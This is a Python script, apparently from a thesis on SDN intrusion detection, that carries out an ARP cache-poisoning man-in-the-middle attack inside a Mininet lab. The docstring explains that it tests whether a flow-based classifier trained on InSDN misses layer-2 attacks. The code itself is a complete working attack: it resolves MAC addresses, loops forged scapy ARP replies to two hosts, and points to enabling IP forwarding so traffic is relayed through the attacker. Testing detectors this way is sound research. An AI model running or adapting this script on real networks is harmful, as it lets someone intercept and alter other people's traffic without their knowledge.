"""
arp_spoof.py
=============
OUT-OF-DISTRIBUTION ATTACK: an ARP cache-poisoning man-in-the-middle.

WHY THIS ONE IS DIFFERENT
-------------------------
The model was trained on InSDN's seven classes:

    Normal, DoS, DDoS, Probe, BFA, Botnet, Web-Attack

Every one of those is defined by an IP-flow *volume or fan-out* signature -
a flood, a scan across many destinations, a burst of login attempts. This
attack has none of that. ARP poisoning works at layer 2: the attacker sends
a trickle of forged ARP replies ("10.1.1.1 is at my MAC") so the victim and
the server each send their traffic to the attacker instead of to each other.
The attacker relays the frames on, so the two ends keep talking and never
notice - meanwhile the attacker reads (and could alter) everything between
them.

At OpenFlow flow-stats granularity the controller sees almost nothing to
label: ARP is ethertype 0x0806, so it never even becomes an IPv4 flow the
feature extractor reads. The IP conversations that do exist keep their normal
rate and size. So a closed-set classifier has no class for this and no signal
to fire on: it reports Normal. That is the point of running it - it is the
open-set / novel-attack blind spot for the thesis, the counter-example to the
"98.6% accuracy" headline. The IDS is only ever as complete as its label set.

RUN (from the attacker host, e.g. h6, inside the Mininet CLI):
  mininet> h6 bash -c "cd attacks && sudo python3 arp_spoof.py --victim 10.1.1.2 --target 10.1.1.1"

With no addresses it reads mininet_topo/topology_state.json and sits between
the web server (victim of interest) and the database host. Ctrl-C restores
both ARP caches before exiting, so the network is left clean.
"""

import argparse
import json
import os
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp

STATE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "..", "mininet_topo", "topology_state.json")


def _load_state_defaults():
    """Pick two IPs to sit between if the user gives none.

    Defaults to (db host -> web server): a client-to-server conversation is the
    natural thing to intercept. Falls back to the first two hosts if roles are
    missing. Returns (victim_ip, target_ip) or (None, None).
    """
    try:
        with open(STATE_PATH) as fh:
            state = json.load(fh)
    except (OSError, ValueError):
        return None, None

    hosts = state.get("hosts", [])
    web = next((h for h in hosts if h.get("role") == "web"), None)
    db = next((h for h in hosts if h.get("role") == "db"), None)
    if web and db:
        return db["ip"].split("/")[0], web["ip"].split("/")[0]
    ips = [h["ip"].split("/")[0] for h in hosts if h.get("ip")]
    return (ips[0], ips[1]) if len(ips) >= 2 else (None, None)


def _mac_of(ip, iface):
    """Resolve an IP to its MAC with one ARP request; None if it never answers."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=2, retry=2, iface=iface, verbose=False)
    for _, reply in ans:
        return reply.hwsrc
    return None


def _poison(victim_ip, victim_mac, spoof_ip, iface):
    """Tell victim that spoof_ip lives at *our* MAC (a forged ARP reply)."""
    sendp(Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                      psrc=spoof_ip),
          iface=iface, verbose=False)


def _restore(a_ip, a_mac, b_ip, b_mac, iface):
    """Undo the poisoning: broadcast each host's true IP->MAC a few times."""
    for _ in range(5):
        sendp(Ether(dst=a_mac) / ARP(op=2, pdst=a_ip, hwdst=a_mac,
                                     psrc=b_ip, hwsrc=b_mac),
              iface=iface, verbose=False)
        sendp(Ether(dst=b_mac) / ARP(op=2, pdst=b_ip, hwdst=b_mac,
                                     psrc=a_ip, hwsrc=a_mac),
              iface=iface, verbose=False)
        time.sleep(0.2)


def run(victim_ip, target_ip, iface, interval):
    print(f"[*] ARP MITM: sitting between {victim_ip} and {target_ip} on {iface}")
    print("[*] Layer-2 attack: no flood, no scan. The flow-based IDS has no "
          "class for this and should report Normal - that is the finding.")

    victim_mac = _mac_of(victim_ip, iface)
    target_mac = _mac_of(target_ip, iface)
    if not victim_mac or not target_mac:
        print(f"[!] Could not resolve MACs (victim={victim_mac}, "
              f"target={target_mac}). Are both hosts up and reachable?")
        return 1
    print(f"[*] {victim_ip} is {victim_mac}, {target_ip} is {target_mac}")
    print("[*] Poisoning both caches. To actually relay traffic, enable "
          "forwarding on this host:  sysctl -w net.ipv4.ip_forward=1")
    print("[*] Ctrl-C to stop and restore.")

    sent = 0
    try:
        while True:
            # Each direction: make the victim believe the OTHER end is at us.
            _poison(victim_ip, victim_mac, target_ip, iface)
            _poison(target_ip, target_mac, victim_ip, iface)
            sent += 2
            if sent % 20 == 0:
                print(f"    ...{sent} forged ARP replies sent")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP caches...")
        _restore(victim_ip, victim_mac, target_ip, target_mac, iface)
        print("[*] Done. Network left clean.")
    return 0


def parse_args():
    p = argparse.ArgumentParser(description="ARP cache-poisoning MITM "
                                            "(out-of-distribution attack)")
    p.add_argument("--victim", help="first host to poison (default: db host "
                                     "from topology_state.json)")
    p.add_argument("--target", help="second host to poison (default: web "
                                     "server from topology_state.json)")
    p.add_argument("--iface", help="attacker interface (default: first eth "
                                    "interface of this host)")
    p.add_argument("--interval", type=float, default=2.0,
                   help="seconds between re-poison rounds (default 2)")
    return p.parse_args()


def _default_iface():
    """This host's own link into the fabric: <name>-eth0 inside a Mininet host."""
    for name in os.listdir("/sys/class/net"):
        if "-eth" in name:
            return name
    return "eth0"


if __name__ == "__main__":
    args = parse_args()
    victim, target = args.victim, args.target
    if not victim or not target:
        dv, dt = _load_state_defaults()
        victim = victim or dv
        target = target or dt
    if not victim or not target:
        sys.exit("Need --victim and --target (or a readable topology_state.json)")
    iface = args.iface or _default_iface()
    # sanity: get_if_hwaddr raises early if the iface name is wrong
    get_if_hwaddr(iface)
    sys.exit(run(victim, target, iface, args.interval))
